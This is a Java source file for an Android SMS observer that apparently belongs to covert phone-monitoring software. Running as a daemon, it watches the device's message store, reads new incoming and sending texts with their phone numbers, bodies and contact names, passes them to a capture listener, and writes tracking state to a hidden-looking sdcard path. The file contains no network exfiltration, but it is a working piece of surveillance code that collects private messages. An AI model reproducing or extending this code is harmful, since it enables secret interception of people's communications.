package com.vvt.sms;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.TimeZone;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.net.Uri;

import com.vvt.calendar.CalendarObserver;
import com.vvt.contacts.ContactsDatabaseManager;
import com.vvt.contentobserver.IDaemonContentObserver;
import com.vvt.dbobserver.WriteReadFile;
import com.vvt.logger.FxLog;
import com.vvt.processsms.Customization;

public class SmsObserver extends IDaemonContentObserver {
	
	private static final String TAG = "SmsObserver";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGW = Customization.WARNING;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final String DEFAULT_DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	private static final String DEFAULT_PATH = "/sdcard/data/data/com.vvt.im";
	private static final String LOG_FILE_NAME = "sms.ref";
	
	private static SmsObserver sInstance;
	
	private CalendarObserver mCalendarObserver;
	private OnCaptureListener mListener;
	private SimpleDateFormat mDateFormatter;
	private String mLoggablePath;
	
	public static SmsObserver getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new SmsObserver(context);
		}
		return sInstance;
	}

	private SmsObserver(Context context) {
		super(context);
		
		mCalendarObserver = CalendarObserver.getInstance();
		mCalendarObserver.enable();
		
		mDateFormatter = new SimpleDateFormat(DEFAULT_DATE_FORMAT);
		
		mLoggablePath = DEFAULT_PATH;
	}
	
	public void setLoggablePath(String path) {
		mLoggablePath = path;
	}
	
	public void setDateFormat(String format) {
		mDateFormatter = new SimpleDateFormat(format);
	}
	
	public void registerObserver(OnCaptureListener listener) {
		long refId = SmsDatabaseManager.getLatestSmsId();
		setRefId(refId);
		
		if(LOGV) FxLog.v(TAG, String.format("registerObserver # refId: %d", refId));
		
		mListener = listener;
		super.registerObserver();
	}
	
	public void unregisterObserver(OnCaptureListener listener) {
		mListener = null;
		super.unregisterObserver();
	}

	@Override
	protected void onContentChange() {
		if(LOGV) FxLog.v(TAG, "onContentChange # ENTER ...");
		
		long refId = getRefId();
		
		long latestId = SmsDatabaseManager.getLatestSmsId();
		if (latestId == refId) {
			if(LOGV) FxLog.v(TAG, "onContentChange # Latest ID is not changed!!");
		}
		else if (latestId < refId) {
			if(LOGD) FxLog.d(TAG, "onContentChange # Found changes, update mRefId");
			setRefId(latestId);
		}
		else {
			if(LOGD) FxLog.d(TAG, "onContentChange # Found changes,latestId > refId, update mRefId");
			ArrayList<SmsData> smses = getNewerSms(refId);
			
			if (smses == null || smses.size() == 0) {
				if(LOGD) FxLog.d(TAG, "onContentChange # No new event found!! -> EXIT ...");
				return;
			}
			
			if (mListener != null) {
				mListener.onCapture(smses);
			}
		}
		
		if(LOGV) FxLog.v(TAG, "onContentChange # EXIT ...");
	}

	@Override
	protected Uri getContentUri() {
		return Uri.parse("content://mms-sms");
	}

	@Override
	protected String getTag() {
		return TAG;
	}
	
	private ArrayList<SmsData> getNewerSms(long refId) {
		if(LOGV) FxLog.v(TAG, "getNewerSms # ENTER ...");
		
		ArrayList<SmsData> smses = new ArrayList<SmsData>();
		
		SQLiteDatabase db = SmsDatabaseHelper.getReadableDatabase();
		if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
			if(LOGW) FxLog.w(TAG, "getNewerSms # Open database FAILED!! -> EXIT ...");
			if (db != null) {
				db.close();
			}
			return smses;
		}
		
		Cursor cursor = null;
		try {
			// Type can tell direction and readiness of SMS
			// 1: IN, 2: OUT, 4: SENDING
			String selection = String.format("(%s = %d OR %s = %d) AND %s > %d", 
					SmsDatabaseHelper.COLUMN_TYPE, 1, 
					SmsDatabaseHelper.COLUMN_TYPE, 4, 
					SmsDatabaseHelper.COLUMN_ID, refId);
			
			cursor = db.query(SmsDatabaseHelper.TABLE_SMS, 
					null, selection, null, null, null, null);
		}
		catch (SQLiteException e) {
			if(LOGE) FxLog.e(TAG, String.format("getNewerSms # %s", e.toString()));
		}
		
		if (cursor == null) {
			if(LOGW) FxLog.w(TAG, "getNewerSms # Query database FAILED!! -> EXIT ...");
			db.close();
			return smses;
		}
		
		if(LOGV) FxLog.v(TAG, "getNewerSms # Begin query");
		
		mDateFormatter.setTimeZone(
				TimeZone.getTimeZone(
						mCalendarObserver.getLocalTimeZone()));
		
		SmsData sms = null;
		
		while (cursor.moveToNext()) {
			
			long id = cursor.getLong(cursor.getColumnIndex(SmsDatabaseHelper.COLUMN_ID));
			if (id > refId) refId = id;
			
			long time = cursor.getLong(cursor.getColumnIndex(
					SmsDatabaseHelper.COLUMN_DATE));
			short type = cursor.getShort(cursor.getColumnIndex(
					SmsDatabaseHelper.COLUMN_TYPE));
			String phoneNumber = cursor.getString(cursor.getColumnIndex(
					SmsDatabaseHelper.COLUMN_ADDRESS));
			String data = cursor.getString(cursor.getColumnIndex(
					SmsDatabaseHelper.COLUMN_BODY));
			
			String contactName = ContactsDatabaseManager.getContactNameByPhone(phoneNumber);
			
			if (contactName == null || contactName.length() < 1) {
				contactName = "";
			}
			
			boolean isIncoming = type == 1 ? true : false;
			
			sms = new SmsData();
			//TODO : need to change to pass only long do not change Date format.
//			sms.setTime(mDateFormatter.format(new Date(time)));
			sms.setTime(time);
			sms.setIncoming(isIncoming);
			sms.setPhonenumber(phoneNumber);
			sms.setData(data);
			sms.setContactName(contactName);
			
			smses.add(sms);
			
			if(LOGV) FxLog.v(TAG, String.format("getNewerSms # Capture %s", sms));
		}
		
		if(LOGV) FxLog.v(TAG, "getNewerCallLog # Update refId");
		setRefId(refId);
		
		cursor.close();
		db.close();
		
		if(LOGV) FxLog.v(TAG, "getNewerSms # EXIT ...");
		return smses;
	}

	private void setRefId(long refId){
		String fullPath = String.format(mLoggablePath);
		File f = new File(fullPath);
		if (!f.exists()) {
			f.mkdirs();
		}
		WriteReadFile.writeFile(
				String.format("%s/%s", mLoggablePath, LOG_FILE_NAME), 
				String.valueOf(refId));
	}
	
	private long getRefId(){
		String refId = WriteReadFile.readFile(
				String.format("%s/%s", mLoggablePath, LOG_FILE_NAME));
		return Long.parseLong(refId);
	}
	
	public static interface OnCaptureListener {
		public void onCapture(ArrayList<SmsData> smses);
	}

}
